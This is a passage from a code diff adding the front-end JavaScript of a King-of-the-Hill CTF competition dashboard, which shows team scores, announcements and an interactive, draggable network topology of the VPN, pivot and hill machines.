+                <div class="ann-msg">${esc(a.message)}</div>
+            </div>`;
+        }).join('');
+    } catch(e) { /* silent */ }
+}
+
+// ── Home Data ──
+async function loadHomeData() {
+    try {
+        const sb = await fetch(API + '/scoreboard').then(r => r.json());
+        const myTeam = sb.teams.find(t => t.team_name === teamData.team_name);
+        const rank = myTeam ? sb.teams.indexOf(myTeam) + 1 : '-';
+
+        document.getElementById('homeStats').innerHTML = `
+            <div class="stat-box green"><div class="val">${myTeam ? myTeam.total_points.toLocaleString() : '0'}</div><div class="lbl">Total Points</div></div>
+            <div class="stat-box cyan"><div class="val">#${rank}</div><div class="lbl">Ranking</div></div>
+            <div class="stat-box orange"><div class="val">${myTeam ? myTeam.hills_owned : '0'}</div><div class="lbl">Hills Owned</div></div>
+            <div class="stat-box purple"><div class="val">${myTeam ? myTeam.total_ticks_as_king : '0'}</div><div class="lbl">Ticks as King</div></div>
+            <div class="stat-box blue"><div class="val">${myTeam ? myTeam.first_bloods : '0'}</div><div class="lbl">First Bloods</div></div>
+            <div class="stat-box green"><div class="val">${sb.game_status ? sb.game_status.toUpperCase().replace('_',' ') : 'N/A'}</div><div class="lbl">Game Status</div></div>
+        `;
+    } catch(e) {
+        document.getElementById('homeStats').innerHTML = '<div class="stat-box"><div class="val" style="font-size:14px;color:var(--text-muted);">Menunggu data...</div></div>';
+    }
+    // Also refresh announcements
+    loadAnnouncements();
+}
+
+// ══════════════════════════════════════════════════
+// INTERACTIVE TOPOLOGY DIAGRAM
+// ══════════════════════════════════════════════════
+
+// Default fallback nodes (used if server has no topology_canvas config)
+const TOPO_NODES_DEFAULT = [
+    { id:'vpn',   label:'VPN Server',  icon:'🌐', w:100, h:70, x:200, y:100 },
+    { id:'koth',  label:'KoTH Server', icon:'🏆', w:100, h:70, x:500, y:100 },
+    { id:'pivot', label:'Pivot DMZ',   icon:'🔀', w:100, h:70, x:500, y:350 },
+    { id:'h1',    label:'Hill 1',      icon:'🏔️', w:100, h:70, x:100, y:350 },
+    { id:'h2',    label:'Hill 2',      icon:'🏔️', w:100, h:70, x:300, y:350 },
+    { id:'h3',    label:'Hill 3',      icon:'🏔️', w:100, h:70, x:700, y:350 },
+    { id:'h4',    label:'Hill 4',      icon:'🏔️', w:100, h:70, x:900, y:350 },
+    { id:'you',   label:'Your Team',   icon:'💻', w:100, h:70, x:200, y:550 },
+];
+
+const TOPO_LINKS_DEFAULT = [
+    { from:'you', to:'vpn', color:'#6b7280', style:'solid', label:'' },
+    { from:'vpn', to:'koth', color:'#3b82f6', style:'solid', label:'' },
+    { from:'vpn', to:'h1', color:'#22c55e', style:'solid', label:'' },
+    { from:'vpn', to:'h2', color:'#22c55e', style:'solid', label:'' },
+    { from:'vpn', to:'pivot', color:'#f59e0b', style:'dashed', label:'' },
+    { from:'pivot', to:'h3', color:'#22c55e', style:'solid', label:'' },
+    { from:'pivot', to:'h4', color:'#22c55e', style:'solid', label:'' },
+];
+
+// Node info details (for click-to-view)
+const NODE_INFO = {
+    vpn:  { 'Network':'10.10.0.0/24','Protocols':'WireGuard / OpenVPN','Port':'51820/UDP' },
+    koth: { 'Services':'Scoreboard, Tick Engine, Scorebot','Access':'Otomatis via VPN','Note':'⛔ JANGAN DISERANG!' },
+    pivot:{ 'Role':'Dual-homed router: VPN ↔ Hill Network','Hint':'Gateway ke semua Hills','Note':'Hill 3 & 4 via pivot' },
+    h1:   { 'IP':'🔍 Scan to discover','Multiplier':'1.0x','King File':'/root/king.txt' },
+    h2:   { 'IP':'🔍 Scan to discover','Multiplier':'1.0x','King File':'/root/king.txt' },
+    h3:   { 'IP':'🔍 Scan to discover','Multiplier':'1.5x (Pivot)','King File':'/root/king.txt','Note':'⚠️ Behind Pivot' },
+    h4:   { 'IP':'🔍 Scan to discover','Multiplier':'1.5x (Pivot)','King File':'/root/king.txt','Note':'⚠️ Behind Pivot' },
+    you:  { 'VPN IP': teamData?.vpn_ip || '10.10.0.XX', 'Team': teamData?.display_name || teamData?.team_name || '-', 'Connection':'WireGuard / OpenVPN' },
+};
+
+// ── Zoom ──
+function applyZoom() {
+    document.getElementById('topoInner').style.transform = `scale(${topoScale})`;
+    document.getElementById('zoomLabel').textContent = Math.round(topoScale * 100) + '%';
+}
+function topoZoom(delta) { topoScale = Math.min(TOPO_ZOOM_MAX, Math.max(TOPO_ZOOM_MIN, topoScale + delta)); applyZoom(); }
+function topoZoomReset() { topoScale = 1; applyZoom(); }
+
+// Map node id to a CSS class for border color
+function nodeClass(id) {
+    if (id === 'vpn') return 'vpn';
+    if (id === 'koth') return 'koth';
+    if (id === 'pivot') return 'pivot';
+    if (id === 'you') return 'team';
+    if (/^h\d/.test(id)) return 'hill';
+    return '';
+}
+
+async function initTopology() {
+    if (topoInitialized) return;
+    topoInitialized = true;
+
+    let canvasData = null;
+
+    // Load full topology canvas from organizer editor
+    try {
+        const resp = await fetch(API + '/scoreboard/topology-canvas');
+        const data = await resp.json();
+        if (data && data.nodes && data.nodes.length > 0) {
+            canvasData = data;
+        }
+    } catch(e) { /* use defaults */ }
+
+    // Populate nodes, links, labels from server data or fallback
+    const srcNodes = canvasData ? canvasData.nodes : TOPO_NODES_DEFAULT;
+    topoLinks = canvasData ? (canvasData.links || []) : TOPO_LINKS_DEFAULT;
+    topoLabels = canvasData ? (canvasData.labels || []) : [];
+
+    // Calculate bounding box to auto-fit into container
+    let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
+    srcNodes.forEach(n => {
+        const hw = (n.w || 100) / 2, hh = (n.h || 70) / 2;
+        if (n.x - hw < minX) minX = n.x - hw;
+        if (n.y - hh < minY) minY = n.y - hh;
+        if (n.x + hw > maxX) maxX = n.x + hw;
+        if (n.y + hh > maxY) maxY = n.y + hh;
+    });
+    const dataW = maxX - minX + 60;
+    const dataH = maxY - minY + 60;
+    const container = document.getElementById('topoCanvas');
+    const containerW = container.clientWidth || 800;
+    const containerH = container.clientHeight || 600;
+    const fitScale = Math.min(containerW / dataW, containerH / dataH, 1);
+    const offsetX = (containerW / fitScale - dataW) / 2 - minX + 30;
+    const offsetY = (containerH / fitScale - dataH) / 2 - minY + 30;
+
+    const inner = document.getElementById('topoInner');
+
+    // Mouse wheel zoom
+    container.addEventListener('wheel', e => {
+        e.preventDefault();
+        topoZoom(e.deltaY < 0 ? 0.08 : -0.08);
+    }, {passive:false});
+
+    // Set initial zoom to fit
+    if (fitScale < 1) {
+        topoScale = fitScale;
+        applyZoom();
+    }
+
+    // Create node elements from canvas data
+    srcNodes.forEach(n => {
+        const el = document.createElement('div');
+        const cls = nodeClass(n.id);
+        el.className = 'topo-node' + (cls ? ' ' + cls : '');
+        el.id = 'node-' + n.id;
+        const posX = n.x + offsetX - (n.w || 100) / 2;
+        const posY = n.y + offsetY - (n.h || 70) / 2;
+        el.style.left = posX + 'px';
+        el.style.top = posY + 'px';
+        el.style.minWidth = (n.w || 100) + 'px';
+        el.innerHTML = `<div class="node-icon">${n.icon}</div><div class="node-name">${(n.label||'').replace('\n','<br>')}</div>`;
+        el.addEventListener('mousedown', e => startDrag(e, n.id));
+        el.addEventListener('touchstart', e => startDrag(e.touches[0], n.id), {passive:false});
+        el.addEventListener('click', e => { e.stopPropagation(); selectNode(n.id); });
+        inner.appendChild(el);
+        nodes.push({ id: n.id, x: posX, y: posY, icon: n.icon, label: n.label, el, w: n.w || 100, h: n.h || 70, origX: n.x, origY: n.y });
+    });
+
+    // Store offset for line drawing
+    inner._offsetX = offsetX;
+    inner._offsetY = offsetY;
+
+    // Draw connections
+    drawLines();
+
+    // Render text labels
+    topoLabels.forEach(lb => {
+        const lbl = document.createElement('div');
+        lbl.className = 'topo-label';
+        lbl.style.position = 'absolute';
+        lbl.style.left = (lb.x + offsetX) + 'px';
+        lbl.style.top = (lb.y + offsetY) + 'px';
+        lbl.style.color = lb.color || '#94a3b8';
+        lbl.style.fontSize = (lb.fontSize || 13) + 'px';
+        lbl.style.fontWeight = '600';
+        lbl.style.pointerEvents = 'none';
+        lbl.style.transform = 'translate(-50%, -50%)';
+        lbl.style.whiteSpace = 'nowrap';
+        lbl.style.zIndex = '5';
+        lbl.textContent = lb.text || '';
+        inner.appendChild(lbl);
+    });
+
+    // Drag handlers
+    document.addEventListener('mousemove', onDrag);
+    document.addEventListener('mouseup', endDrag);
+    document.addEventListener('touchmove', e => onDrag(e.touches[0]), {passive:false});
+    document.addEventListener('touchend', endDrag);
+
+    // Deselect
+    container.addEventListener('click', () => {
+        selectedNode = null;
+        document.querySelectorAll('.topo-node').forEach(n => n.classList.remove('selected'));
+        document.getElementById('topoInfo').classList.remove('show');
+    });
+}
+
+function startDrag(e, nodeId) {
+    dragging = nodeId;
+    const node = nodes.find(n => n.id === nodeId);
+    const rect = node.el.getBoundingClientRect();
+    dragOffX = e.clientX - rect.left;
+    dragOffY = e.clientY - rect.top;
+    node.el.style.zIndex = 50;
+    document.getElementById('topoCanvas').classList.add('grabbing');
+}
+
+function onDrag(e) {
+    if (!dragging) return;
+    e.preventDefault && e.preventDefault();
+    const canvas = document.getElementById('topoCanvas');
+    const rect = canvas.getBoundingClientRect();
+    const node = nodes.find(n => n.id === dragging);
+    let nx = (e.clientX - rect.left - dragOffX) / topoScale;
+    let ny = (e.clientY - rect.top - dragOffY) / topoScale;
+    nx = Math.max(0, Math.min(rect.width / topoScale - node.el.offsetWidth, nx));
+    ny = Math.max(0, Math.min(rect.height / topoScale - node.el.offsetHeight, ny));
+    node.x = nx; node.y = ny;
+    node.el.style.left = nx + 'px';
+    node.el.style.top = ny + 'px';
+    drawLines();
+}
+
+function endDrag() {
+    if (dragging) {
+        const node = nodes.find(n => n.id === dragging);
+        if (node) node.el.style.zIndex = 10;
+    }
+    dragging = null;
+    document.getElementById('topoCanvas').classList.remove('grabbing');
+}
+
+function selectNode(nodeId) {
+    selectedNode = nodeId;
+    const nodeData = nodes.find(n => n.id === nodeId);
+    document.querySelectorAll('.topo-node').forEach(n => n.classList.remove('selected'));
+    document.getElementById('node-' + nodeId).classList.add('selected');
+
+    const info = document.getElementById('topoInfo');
+    const infoData = NODE_INFO[nodeId] || { 'Label': nodeData?.label || nodeId };
+    document.getElementById('infoTitle').textContent = (nodeData?.icon || '') + ' ' + (nodeData?.label || nodeId).replace('\n',' — ');
+    document.getElementById('infoGrid').innerHTML = Object.entries(infoData).map(([k,v]) =>
+        `<div class="topo-info-item"><div class="k">${k}</div><div class="v">${v}</div></div>`
+    ).join('');
+    info.classList.add('show');
+}
+
+function drawLines() {
+    const svg = document.getElementById('topoSvg');
+    const inner = document.getElementById('topoInner');
+    const w = inner.scrollWidth || inner.offsetWidth;
+    const h = inner.scrollHeight || inner.offsetHeight;
+    svg.setAttribute('viewBox', `0 0 ${w} ${h}`);
+    svg.setAttribute('width', w);
+    svg.setAttribute('height', h);
+    svg.innerHTML = '';
+
+    // Add SVG defs for arrow markers
+    const defs = document.createElementNS('http://www.w3.org/2000/svg','defs');
+    svg.appendChild(defs);
+
+    topoLinks.forEach(lk => {
+        const fromN = nodes.find(n => n.id === lk.from);
+        const toN = nodes.find(n => n.id === lk.to);
+        if (!fromN || !toN) return;
+
+        const x1 = fromN.x + fromN.el.offsetWidth / 2;
+        const y1 = fromN.y + fromN.el.offsetHeight / 2;
+        const x2 = toN.x + toN.el.offsetWidth / 2;
+        const y2 = toN.y + toN.el.offsetHeight / 2;
+
+        const line = document.createElementNS('http://www.w3.org/2000/svg','line');
+        line.setAttribute('x1', x1);
+        line.setAttribute('y1', y1);
+        line.setAttribute('x2', x2);
+        line.setAttribute('y2', y2);
+        line.setAttribute('stroke', lk.color || '#6b7280');
+        line.setAttribute('stroke-width', '2.5');
+        if (lk.style === 'dashed') line.setAttribute('stroke-dasharray', '8 4');
+        else if (lk.style === 'dotted') line.setAttribute('stroke-dasharray', '3 3');
+        line.style.pointerEvents = 'none';
+        svg.appendChild(line);
+
+        // Link label
+        if (lk.label) {
+            const txt = document.createElementNS('http://www.w3.org/2000/svg','text');
+            txt.setAttribute('x', (x1+x2)/2);
+            txt.setAttribute('y', (y1+y2)/2 - 8);
+            txt.setAttribute('text-anchor', 'middle');
+            txt.setAttribute('fill', '#cbd5e1');
+            txt.setAttribute('font-size', '11');
+            txt.textContent = lk.label;
+            svg.appendChild(txt);
+        }
+    });
+}
+
+// Auto-refresh home every 10s
+setInterval(loadHomeData, 10000);
+</script>
+</body>
+</html>
